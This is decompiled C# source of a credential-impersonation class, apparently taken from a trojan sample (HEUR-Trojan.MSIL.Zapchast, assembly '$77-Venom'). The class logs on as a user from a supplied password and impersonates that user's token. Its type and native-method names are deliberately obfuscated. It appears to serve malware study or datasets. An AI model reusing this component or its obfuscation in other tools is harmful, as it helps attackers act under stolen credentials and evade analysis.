// Decompiled with JetBrains decompiler
// Type: Tools.Network.Impersonator
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace Tools.Network
{
  public class Impersonator : IDisposable
  {
    private WindowsImpersonationContext _wic;

    public Impersonator(
      string userName,
      string domainName,
      string password,
      \uA7BCẦ蘛큚텇\u9FF5韇钜\uF5E9ᆃ듂栀\u27AD莠녍ፋၦ뇵弉쮎 logonType,
      \u2938ѫ僙ꨟ䧯꧙频腛फ瘩\uF0C4䣖\u2834箰\u29FE䡱ᇂ鱺鑈\uFFFD logonProvider)
    {
      this.Impersonate(userName, domainName, password, logonType, logonProvider);
    }

    public Impersonator(string userName, string domainName, string password) => this.Impersonate(userName, domainName, password, \uA7BCẦ蘛큚텇\u9FF5韇钜\uF5E9ᆃ듂栀\u27AD莠녍ፋၦ뇵弉쮎.㳸賧\uE422鎱쀚뢒楦힍\uE52B襼溋븪綎酓淭僲胡茯䅬쁰, \u2938ѫ僙ꨟ䧯꧙频腛फ瘩\uF0C4䣖\u2834箰\u29FE䡱ᇂ鱺鑈\uFFFD.穖ꈐ턛\uED1C\uEE67螫늏ﭧ\uFFFDᜩ뤖\uFFFD유헆贔펳慹\uFFFD\uF333얨);

    public Impersonator()
    {
    }

    public void Dispose() => this.UndoImpersonation();

    public void Impersonate(string userName, string domainName, string password) => this.Impersonate(userName, domainName, password, \uA7BCẦ蘛큚텇\u9FF5韇钜\uF5E9ᆃ듂栀\u27AD莠녍ፋၦ뇵弉쮎.㳸賧\uE422鎱쀚뢒楦힍\uE52B襼溋븪綎酓淭僲胡茯䅬쁰, \u2938ѫ僙ꨟ䧯꧙频腛फ瘩\uF0C4䣖\u2834箰\u29FE䡱ᇂ鱺鑈\uFFFD.穖ꈐ턛\uED1C\uEE67螫늏ﭧ\uFFFDᜩ뤖\uFFFD유헆贔펳慹\uFFFD\uF333얨);

    public void Impersonate(
      string userName,
      string domainName,
      string password,
      \uA7BCẦ蘛큚텇\u9FF5韇钜\uF5E9ᆃ듂栀\u27AD莠녍ፋၦ뇵弉쮎 logonType,
      \u2938ѫ僙ꨟ䧯꧙频腛फ瘩\uF0C4䣖\u2834箰\u29FE䡱ᇂ鱺鑈\uFFFD logonProvider)
    {
      this.UndoImpersonation();
      IntPtr zero1 = IntPtr.Zero;
      IntPtr zero2 = IntPtr.Zero;
      try
      {
        this._wic = WindowsIdentity.Impersonate(IntPtr.Zero);
        if (뮀힅谆촿蛆븤槾辿湈늒퀇ᴟ\u2267슣䨲ʾ\uE9D1晏Ꮂ\u32C5.\uF21A\u21FF뫬\u25D2袞\uE327뵤컀䎲䇕\uFFFD᯦蝬\uEB7F㼓㨝쳾鏿菧兑(userName, domainName, password, (int) logonType, (int) logonProvider, ref zero1) == 0)
          throw new Win32Exception(Marshal.GetLastWin32Error());
        if (뮀힅谆촿蛆븤槾辿湈늒퀇ᴟ\u2267슣䨲ʾ\uE9D1晏Ꮂ\u32C5.ⴥ遭킮\uA828ﵻ\uFFFDꑘ进髣闣䀹\u0B91ᵺ\uFFFD\uEC9A㖾Ïᵎ潧놋(zero1, 2, ref zero2) == 0)
          throw new Win32Exception(Marshal.GetLastWin32Error());
        new WindowsIdentity(zero2).Impersonate();
      }
      finally
      {
        if (zero1 != IntPtr.Zero)
          뮀힅谆촿蛆븤槾辿湈늒퀇ᴟ\u2267슣䨲ʾ\uE9D1晏Ꮂ\u32C5.쀽\uF1F2ͫ廽ᢐ迭焬罸︂鬡魷\uE5C5搌Ĉ绵\u3356䦨ㆫ\u264E鵹(zero1);
        if (zero2 != IntPtr.Zero)
          뮀힅谆촿蛆븤槾辿湈늒퀇ᴟ\u2267슣䨲ʾ\uE9D1晏Ꮂ\u32C5.쀽\uF1F2ͫ廽ᢐ迭焬罸︂鬡魷\uE5C5搌Ĉ绵\u3356䦨ㆫ\u264E鵹(zero2);
      }
    }

    private void UndoImpersonation()
    {
      if (this._wic != null)
        this._wic.Undo();
      this._wic = (WindowsImpersonationContext) null;
    }
  }
}
